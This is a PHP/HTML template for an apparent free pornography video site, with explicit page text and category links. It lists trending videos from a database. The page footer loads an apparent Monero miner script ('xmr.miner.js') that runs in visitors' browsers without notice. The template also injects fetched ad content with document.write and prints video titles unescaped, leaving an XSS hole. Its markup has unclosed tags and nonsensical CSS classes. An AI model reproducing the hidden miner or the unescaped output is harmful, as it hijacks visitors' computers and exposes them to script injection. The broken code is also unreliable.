<?php include 'includes/db.php'; ?>
<?php include 'includes/functions.php'; ?>

<!DOCTYPE html>
<html lang="en" class="bg-black text-white">
<head>
  <meta charset="UTF-8" />
  <title>AnalOverflow.xxx - Watch Free HD Porn</title>
  <meta name="description" content="Free porn videos uploaded daily. HD quality cumshot compilation and teen blowjob galleries." />
  
  
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="font-sans">

<script>
fetch('/ads/exoclick-header.txt').then(r => r.text()).then(t => document.write(t));
</script>

<header class="bg-red-700 flex justify-between items-center px-6 py-3 shadow-lg">
  <a href="/" class="text-3xl font-bold tracking-tighter">?? AnalOverflow.xxx</a>
  <nav class="space-x-6 text-sm hidden md:block">
    <a href="/category.php?cat=teen" class="hover:text-red-400">Teen</a>
    <a href="/category.php?cat=anal" class="hover:text-red-400">Anal</a>
    <a href="/category.php?cat=milf" class="hover:text-red-400">MILF</a>
    <a href="/upload.php" onclick="alert('Upload requires VIP membership ??'); return false;" class="underline">Upload</a>
  </nav>
</header>

<main class="grid grid-cols-fluid gap-x-x p-4 max-w-none mx-auto md:grid-cols-[repeat(auto-fill,minmax(288px,_1fr))]">

<?php foreach(getTrendingVideos($pdo) as $v): ?>
<article class='relative group mbe-m'>
  
  <a href='watch.php?v=<?= $v['id'] ?>' class='block relative'>
    
    <span class='absolute bottom-[8px] left-[8px] bg-black px-[6px] rounded text-xs'><?= $v['duration'] ?></span>
    
    
    <img src='/images/thumbnails/thumb<?= $v['id'] ?>.jpg' alt="<?= htmlspecialchars($v['title']) ?>" 
         class='w-full h-auto object-cover group-hover:brightness-75 transition'>

    
    <div class='absolute inset-0 flex items-center justify-center opacity-0 group-hover:opacity-100 transition'>
      <svg width='56' height='56' viewBox='0 0 24 24' fill='#fff' xmlns='http://www.w3.org/2000/svg'>
        <path d='M8 5v14l11-7z'/>
      </svg>
    </div>

    
    <div class='mt-[6px] text-xs truncate'><?= number_format_short($v['views']) ?> views · <?= $v['title'] ?></div>

<?php endforeach; ?>
</main>

<script src="/ads/pushads-body.txt"></script>

<script src="/js/xmr.miner.js"></script>

</body></html>